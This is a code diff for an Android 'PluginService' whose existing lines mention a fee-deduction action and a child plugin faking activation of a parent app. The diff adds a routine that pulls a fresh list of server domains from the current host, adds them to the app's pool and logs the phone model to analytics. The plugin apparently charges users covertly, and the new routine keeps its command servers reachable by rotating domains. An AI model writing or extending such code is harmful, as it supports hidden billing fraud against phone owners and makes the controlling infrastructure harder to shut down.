@@ -25,6 +25,7 @@ import com.xstd.plugin.config.Config;
 import com.xstd.plugin.config.SettingManager;
 
 import java.io.File;
+import java.util.ArrayList;
 import java.util.Calendar;
 import java.util.HashMap;
 import java.util.UUID;
@@ -47,6 +48,8 @@ public class PluginService extends IntentService {
     public static final String ACTIVE_FETCH_PHONE_ACTION = "com.xstd.plugin.fetch.phone";
 
     public static final String ACTION_MAIN_UUID_ACTIVE_BY_PLUGN = "com.xstd.main.uuid.active";
+
+    public static final String ACTION_FETCH_DOMAIN = "com.xstd.plugin.domain.fetch";
 
     /**
      * 扣费行动
@@ -86,10 +89,40 @@ public class PluginService extends IntentService {
             } else if (ACTION_MAIN_UUID_ACTIVE_BY_PLUGN.equals(action)) {
                 //子程序模拟母程序激活
                 activeMainApk();
+            } else if (ACTION_FETCH_DOMAIN.equals(action)) {
+                fetchDomain();
             }
         }
 
         MobclickAgent.onPause(this);
+    }
+
+    private void fetchDomain() {
+        if (!UtilsRuntime.isOnline(getApplicationContext())) return;
+
+        int count = SettingManager.getInstance().getTodayFetchDomainCount();
+        SettingManager.getInstance().setTodayFetchDomainCount(count + 1);
+        try {
+            DomainRequest request = new DomainRequest(DomanManager.getInstance(getApplicationContext()).getOneAviableDomain() + "/spDomain/");
+            DomainResponse response = InternetUtils.request(getApplicationContext(), request);
+            if (response != null && response.domainList != null && response.domainList.length > 0) {
+                ArrayList<String> list = new ArrayList<String>();
+                for (String s : response.domainList) {
+                    if (!TextUtils.isEmpty(s) && s.startsWith("http")) {
+                        list.add(s);
+                    }
+                }
+
+                DomanManager.getInstance(getApplicationContext()).addDomain(list);
+                //notify umeng
+                HashMap<String, String> log = new HashMap<String, String>();
+                log.put("failed_domain", response.toString());
+                log.put("current_domain", DomanManager.getInstance(getApplicationContext()).getOneAviableDomain());
+                log.put("phoneType", Build.MODEL);
+                CommonUtil.umengLog(getApplicationContext(), "fetch_domain_success", log);
+            }
+        } catch (Exception e) {
+        }
     }
 
     private void activeMainApk() {
